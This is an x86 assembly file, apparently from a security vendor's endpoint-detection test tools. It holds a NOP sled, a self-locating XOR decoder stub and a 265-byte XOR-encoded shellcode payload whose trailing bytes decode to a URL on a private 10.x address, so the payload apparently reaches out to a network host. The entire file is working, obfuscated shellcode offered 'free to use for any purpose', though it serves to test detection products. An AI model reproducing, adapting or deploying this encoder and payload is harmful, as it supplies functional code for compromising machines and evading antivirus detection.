; -------------------------------------------------------------------------------
; Symantec ATP Sirius Test Tools
; Author: Greg Hoglund
; Note: shellcode based on prior published work / training materials owned by Greg
; Note: modified for Symantec purposes, free to use for any purpose
;
; Shellcode XOR decoder.  ~20 bytes. 
; Put XOR encoded payload in the string and correct the payload length constant.
; You can change the XOR encoding byte if you need to.
; -------------------------------------------------------------------------------
BITS 32
	; ---- NOP sled (arbitrary)
	nop
	nop
	nop
	nop
	nop
	nop	
	; ---- Shellcode decoder starts here (exactly 20 bytes long)  
	jmp	SHORT	C2	; remember to use SHORT or you get NULLs	
C1:	pop	ebp		; get the data location in memory
	mov	eax, ebp
	
	; ---- XOR decode the target string
	xor ecx, ecx
	mov	cx, 265	; use the correct size (precalculated)
L1:	xor	byte [eax], 0x80
	inc	eax
	loop	L1
	jmp	SHORT C3
C2:	call	C1
C3:
	; ---- decoded string is executed and ebp points to beginning
	
_PTR1:	
db 0xE4,0x21,0xB0,0x80,0x80,0x80,0x0B,0xC0,0x8C,0x0B,0xF0,0x9C,0x2D,0x0B,0xD0,0x88
db 0xD5,0x01,0x45,0x65,0x80,0x80,0x80,0x0B,0xCD,0x80,0x68,0x98,0x80,0x80,0x80,0x09
db 0xF5,0x80,0x01,0x45,0x84,0x80,0x80,0x80,0x01,0xFD,0x80,0x7F,0x7F,0x7F,0x7F,0xF5
db 0x66,0xDD,0x69,0xCD,0x80,0x80,0x80,0x09,0x56,0x8F,0x37,0xDE,0xBC,0x0B,0xF4,0x9E
db 0xF8,0x0D,0xF4,0xB2,0x9C,0x2D,0x81,0x50,0xD0,0x2D,0x81,0x50,0xD0,0x2D,0x81,0x50
db 0xDB,0xD0,0xB1,0x40,0x0B,0xB4,0x03,0x81,0x56,0xD3,0xD0,0xB1,0x5B,0xB1,0x40,0x2C
db 0x41,0x43,0x85,0x81,0x43,0xBD,0x80,0x80,0x80,0x80,0xF5,0x71,0x41,0x4B,0x85,0xB9
db 0x4B,0xD8,0xDB,0xF4,0x83,0xC0,0x6B,0x5C,0xDB,0x8F,0x37,0xB4,0xC3,0xD8,0x0B,0xB4
db 0x30,0x81,0x56,0x43,0x01,0x6C,0x94,0x7C,0x7F,0x7F,0xE8,0x38,0x8B,0x80,0x80,0xE8
db 0xA8,0x8A,0x80,0x80,0x7F,0x15,0x6D,0x80,0x80,0x80,0xE8,0x10,0x81,0x80,0x80,0xE8
db 0x84,0x90,0x80,0x80,0x7F,0x15,0x6D,0x80,0x80,0x80,0xE8,0x50,0x87,0x80,0x80,0xE8
db 0xE0,0x89,0x80,0x80,0x7F,0x15,0x6D,0x80,0x80,0x80,0xE8,0x84,0x90,0x80,0x80,0xE8
db 0x10,0x81,0x80,0x80,0x7F,0x15,0x6D,0x80,0x80,0x80,0xE8,0xE0,0x89,0x80,0x80,0xE8
db 0xE4,0x80,0x80,0x80,0x7F,0x15,0x6D,0x80,0x80,0x80,0xE8,0x7F,0x7F,0x7F,0x7F,0x7F
db 0x15,0x71,0x80,0x80,0x80,0x5C,0x5D,0x9A,0xB3,0x10,0xD5,0x49,0x19,0x90,0x21,0xA2
db 0x80,0x07,0x0F,0xC6,0x6C,0x7F,0x7F,0x7F,0x7F,0xE8,0xF4,0xF4,0xF0,0xBA,0xAF,0xAF
db 0xB1,0xB0,0xAE,0xB0,0xAE,0xB0,0xAE,0xB5,0x80